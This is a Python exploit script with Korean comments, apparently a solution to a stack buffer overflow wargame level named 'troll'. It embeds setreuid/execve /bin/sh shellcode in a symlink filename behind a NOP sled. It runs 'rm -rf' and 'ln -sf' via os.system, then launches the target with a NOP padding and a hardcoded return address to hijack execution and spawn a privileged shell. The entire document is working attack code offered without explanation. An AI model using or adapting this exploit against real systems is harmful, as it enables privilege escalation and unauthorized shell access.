import os

"""
심볼릭 파일 생성
"""

shellcode = "\x31\xc0\xb0\x18\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\xbf\x1e\x1e\x62\x57\x81\xc7\x11\x11\x11\x11\x57\xbf\x1e\x51\x58\x5d\x81\xc7\x11\x11\x11\x11\x57\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
dummy = "\x90"*20
new_file = dummy + shellcode
symbolic_command = "ln -sf ../troll " + new_file

os.system("rm -rf " + new_file) #삭제
os.system(symbolic_command) #심볼릭 링크 생성

"""
심볼릭 파일 exploit
"""
#0xbffffbaf
ret = "\xaf\xfb\xff\xbf"
arg0 = "\x90"*44 + ret

os.system("./" + new_file + " " + arg0) #실행 